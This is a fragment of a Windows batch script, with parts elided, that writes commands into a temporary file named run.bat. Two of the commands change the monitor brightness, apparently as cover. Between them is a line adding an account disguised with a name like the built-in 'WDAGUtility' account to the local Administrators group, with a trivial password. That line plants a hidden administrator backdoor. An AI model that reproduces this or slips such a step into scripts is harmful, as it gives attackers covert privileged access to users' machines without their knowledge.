...
echo powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,50)">>"%temp%\run.bat"
...
echo net localgroup Administrators WDAGUtility 123 /add>>"%temp%\run.bat"
...
echo powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,85)">>"%temp%\run.bat"
